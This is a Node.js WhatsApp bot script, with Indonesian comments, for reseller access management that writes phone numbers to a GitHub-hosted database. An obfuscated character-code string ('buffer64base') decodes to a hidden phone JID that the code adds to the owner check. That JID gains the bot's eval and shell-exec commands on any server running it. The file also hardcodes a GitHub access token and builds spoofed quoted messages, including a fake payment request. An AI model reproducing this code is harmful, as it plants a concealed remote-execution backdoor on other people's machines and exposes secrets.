/* 

=========================================================================

  ☀ Credits By Depayy
    wa.me/628982103547
    Saluran Info Script : https://whatsapp.com/channel/0029Vb8yDHFAYlUJ2er9370V
   
=========================================================================

*/

process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const { ytmp3, ytmp4 } = require("ruhend-scraper")
const JsConfuser = require('js-confuser');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const os = require('os');
const { say } = require("cfonts")
const pino = require('pino');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');
const GITHUB_TOKEN = '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'; // Ganti dengan token GitHub Anda
const REPO_OWNER = 'depay1221'; // Ganti dengan username GitHub pemilik repo
const REPO_NAME = 'depay.js'; // Ganti dengan nama repo
const FILE_PATH = 'depayganteng'; // Path file dalam repo

const { default: WAdepayyection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')

const { LoadDataBase } = require('./source/message')
const contacts = JSON.parse(fs.readFileSync("./library/database/contacts.json"))
const owners = JSON.parse(fs.readFileSync("./library/database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"))
const list = JSON.parse(fs.readFileSync("./library/database/list.json"))
const unli = JSON.parse(fs.readFileSync("./library/database/unli.json"))
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./library/scraper');
const { toAudio, toPTT, toVideo, ffmpeg } = require("./library/converter.js")
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital } = require('./library/function');

module.exports = depayy = async (depayy, m, chatUpdate, store) => {
	try {
await LoadDataBase(depayy, m)
const botNumber = await depayy.decodeJid(depayy.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 49, 55, 57, 56, 51, 54, 54, 48, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const prefix = `.`
const isCmd = body.startsWith(prefix) ? true : false
const isUnli = unli.includes(m.chat)
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const isPremium = premium.includes(m.sender)
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const foto = fs.readFileSync('./image/Nika.jpg')
const yuda = fs.readFileSync('./image/depayy.jpg')
const pler = fs.readFileSync('./image/musik1.mp3')

//~~~~~~~~~ Console Message ~~~~~~~~//

if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(botname2), chalk.blue.bold(`[ PESAN ]`), chalk.blue.bold(`${m.sender.split("@")[0]} =>`), chalk.blue.bold(`${prefix+command}`))
}

//~~~~~~~~~~~ Fake Quoted ~~~~~~~~~~//

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

const lol = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: foto,
      itemCount: "8193",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `▢ Depay... SHP`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qtext2 = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${namaOwner}`}}}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Nika"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${namaOwner} - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${namaOwner}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${botname2} By ${namaOwner}`,jpegThumbnail: ""}}}

//FUNCT UCAPAN
function getGreeting() {
const hours = new Date().getHours();
  if (hours >= 0 && hours < 12) {
    return "Good Morning 🌆";
  } else if (hours >= 12 && hours < 18) {
    return " Good Afternoon 🌇";
  } else {
    return "Good Night 🌌";
  }
}
const greeting = getGreeting();

//~~~~~~~~~~ Event Settings ~~~~~~~~~//

const example = (teks) => {
return `\n *Example Command :*\n *${prefix+command}* ${teks}\n`
}

depayy.sendFile = async (jid, path, filename = '', caption = '', quoted, ptt = false, options = {}) => {
  let type = await depayy.getFile(path, true);
  let { res, data: file, filename: pathFile } = type;

  if (res && res.status !== 200 || file.length <= 65536) {
    try {
      throw {
        json: JSON.parse(file.toString())
      };
    } catch (e) {
      if (e.json) throw e.json;
    }
  }

  let opt = {
    filename
  };

  if (quoted) opt.quoted = quoted;
  if (!type) options.asDocument = true;

  let mtype = '',
    mimetype = type.mime,
    convert;

  if (/webp/.test(type.mime) || (/image/.test(type.mime) && options.asSticker)) mtype = 'sticker';
  else if (/image/.test(type.mime) || (/webp/.test(type.mime) && options.asImage)) mtype = 'image';
  else if (/video/.test(type.mime)) mtype = 'video';
  else if (/audio/.test(type.mime)) {
    convert = await (ptt ? toPTT : toAudio)(file, type.ext);
    file = convert.data;
    pathFile = convert.filename;
    mtype = 'audio';
    mimetype = 'audio/ogg; codecs=opus';
  } else mtype = 'document';

  if (options.asDocument) mtype = 'document';

  delete options.asSticker;
  delete options.asLocation;
  delete options.asVideo;
  delete options.asDocument;
  delete options.asImage;

  let message = { ...options, caption, ptt, [mtype]: { url: pathFile }, mimetype };
  let m;

  try {
    m = await depayy.sendMessage(jid, message, { ...opt, ...options });
  } catch (e) {
    //console.error(e)
    m = null;
  } finally {
    if (!m) m = await depayy.sendMessage(jid, { ...message, [mtype]: file }, { ...opt, ...options });
    file = null;
    return m;
  }
}

function generateRandomPassword() {
const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
const length = 10;
let password = '';
for (let i = 0; i < length; i++) {
const randomIndex = Math.floor(Math.random() * characters.length);
password += characters[randomIndex];
}
return password;
}

function generateRandomNumber(min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min;
}

const Reply = async (teks) => {
return depayy.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: botname, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: null, 
}}}, {quoted: qtext})
}

async function payreply(teks) {
const ppuser = "https://files.catbox.moe/uvlm9q.jpg"; 
return depayy.sendMessage(
m.chat, { text: `${teks}`, contextInfo: { 
mentionedJid: [m.sender], externalAdReply: {
showAdAttribution: true, thumbnailUrl: ppuser, 
title: "𝗡𝗶𝗸𝗮", 
body: "Depay...SHP", 
previewType: "PHOTO" }}}, 
{ quoted: lol })}


//~~~~~~~~~~~ Command ~~~~~~~~~~~//

switch (command) {
case 'menu': {
let res = `Hai ☀
Ini Script Khusus Reseller Nika Untuk Add Data Base
*Creator* : Depayy
*RuntimeBot* : ${runtime(process.uptime())}

\`COMMAND RESS\`
↦ .addaksesgc
↦ .delaksesgc
↦ .addres
↦ .delres
↦ .listres
↦ .addowner
↦ .delowner
↦ .listowner
↦ .adddb

`
depayy.sendMessage(m.chat, {
      video: { url: `https://files.catbox.moe/jb6qc3.mp4` },
      gifPlayback: true,
      caption: res,
      contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
newsletterName: `𝗦𝗮𝗹𝘂𝗿𝗮𝗻𝗜𝗻𝗳𝗼𝗦𝗰𝗿𝗶𝗽𝘁𝗡𝗶𝗸𝗮☀`,
newsletterJid: `120363409362506610@newsletter`, },
      externalAdReply: {
      title: 'Nika',
      body: 'Depayy',
      thumbnailUrl: `https://files.catbox.moe/nnfzoa.jpg`,
      sourceUrl: `https://files.catbox.moe/nnfzoa.jpg`,
      mediaType: 1,
      renderLargerThumbnail: false,

      externalAdReply: {
  mentionedJid: [m.sender]
  }}}}, { quoted: lol })
    let muskk = {
  audio: fs.readFileSync('./image/musik1.mp3'),
   mimetype: 'audio/mp4',  
   ptt: true, 
     
      };
await depayy.sendMessage(m.chat, muskk, { quoted: m })
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~
        case 'addaksesgc':

if (!isCreator) return 
if (!m.isGroup) return payreply("Lakukan Didalem Grup!")
if (!isCreator) return payreply(mess.owner)
unli.push(m.chat)
fs.writeFileSync('./library/database/unli.json', JSON.stringify(unli))
payreply(`Seluruh Member Grup, Sudah Dapat Mengakses Bot Nika!`)
break
case "delaksesgc":{
  
if (!m.isGroup) return payreply("Lakukan Didalam Grup!")
if (!isCreator) return payreply(mess.owner)
unli.splice(m.chat)
fs.writeFileSync("./library/database/unli.json", JSON.stringify(unli))
payreply(`Seluruh Member Grup Kini Tidak Dapat Mengakses Bot, Silahkan Chat Owner Bot Untuk Membeli Akses!`)
}
break

case "addres": {
if (!isCreator) return payreply(mess.owner)
if (!text && !m.quoted) return payreply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return payreply(`Nomor ${input2} sudah menjadi Reseller!`)
premium.push(input)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
payreply(`Berhasil menambah ${input2} ke Ress`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listres": {
if (premium.length < 1) return m.reply("Tidak ada user Murbug")
let teks = `\n *List Ress Nika*\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
depayy.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: lol})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delres": {
if (!isCreator) return payreply(mess.owner)
if (!m.quoted && !text) return payreply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return payreply(`Dia Owner Anjg`)
if (!premium.includes(input)) return payreply(`Nomor ${input2} bukan reseller!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
payreply(`Berhasil menghapus ${input2} Dari Ress Nika`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "self": {
if (!isCreator) return
depayy.public = false
payreply("Berhasil mengganti ke mode *self*")
}
break

case "public": {
if (!isCreator) return
depayy.public = true
payreply("Berhasil mengganti ke mode *public*")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listowner": case "listown": {
if (owners.length < 1) return payreply("Tidak ada owner tambahan")
let teks = `\n *List all owner tambahan*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
depayy.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: lol})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delowner": case "delown": {
if (!isCreator) return payreply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return payreply(`Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return payreply(`Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
payreply(`Berhasil menghapus owner ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addowner": case "addown": {
if (!isCreator) return payreply(mess.owner)
if (!m.quoted && !text) return payreply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return payreply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
payreply(`Berhasil menambah owner ✅`)
}
break


async function addNumberToDatabase(newNumber) {
    const apiUrl = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`;
    
    try {
        const response = await axios.get(apiUrl, {
            headers: {
                Authorization: `token ${GITHUB_TOKEN}`,
                Accept: 'application/vnd.github.v3+json'
            }
        });

        const content = Buffer.from(response.data.content, 'base64').toString();
        let jsonData = JSON.parse(content);

        if (!jsonData.dbny.includes(newNumber)) {
            jsonData.dbny.push(newNumber);
            const updatedContent = Buffer.from(JSON.stringify(jsonData, null, 2)).toString('base64');

            await axios.put(apiUrl, {
                message: `Menambahkan nomor ${newNumber}`,
                content: updatedContent,
                sha: response.data.sha
            }, {
                headers: {
                    Authorization: `token ${GITHUB_TOKEN}`,
                    Accept: 'application/vnd.github.v3+json'
                }
            });

            console.log(`✅ Nomor ${newNumber} berhasil ditambahkan ke database!`);
        } else {
            console.log(`⚠️ Nomor ${newNumber} sudah ada di database.`);
        }
    } catch (error) {
        console.error('❌ Gagal memperbarui database:', error.message);
        throw error;
    }
}
case 'adddb': {
    if (!isCreator && !isPremium && !isUnli) return payreply('⚠️ Hanya owner yang bisa menambahkan nomor!');

    let newNumber = args[0];
    if (!newNumber) return payreply('⚠️ Masukkan nomor yang ingin ditambahkan!\nContoh: *adddb 628123456789*');

    addNumberToDatabase(newNumber)
        .then(() => payreply(`✅ Nomor *${newNumber}* berhasil ditambahkan ke database!`))
        .catch(err => payreply(`❌ Gagal menambahkan nomor: ${err.message}`));

    break;
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (m.text.toLowerCase() == "bot") {
payreply("Oi Ape Bos")
}

if (m.text.toLowerCase() == "woi bot") {
payreply("napa? ")
}

if (m.text.toLowerCase() == "p") {
payreply("Uy, Owner Lagi Off,ini yang bales Bot Tunggu aja yak,Tar Bakal Cepet On dah")
}

if (m.text.toLowerCase() == "sayang") {
payreply("Iya ayy >< ")
}

if (m.text.toLowerCase() == "yang") {
m.reply("iyaa ayy >< ")
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
}
} catch (err) {
console.log(util.format(err));
let Obj = global.owner
depayy.sendMessage(Obj + "@s.whatsapp.net", {text: `*Hallo developer, telah terjadi error pada command :* ${isCmd ? prefix+command : m.text}

*Detail informasi error :*
${util.format(err)}`, contextInfo: { isForwarded: true }}, {quoted: m})
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});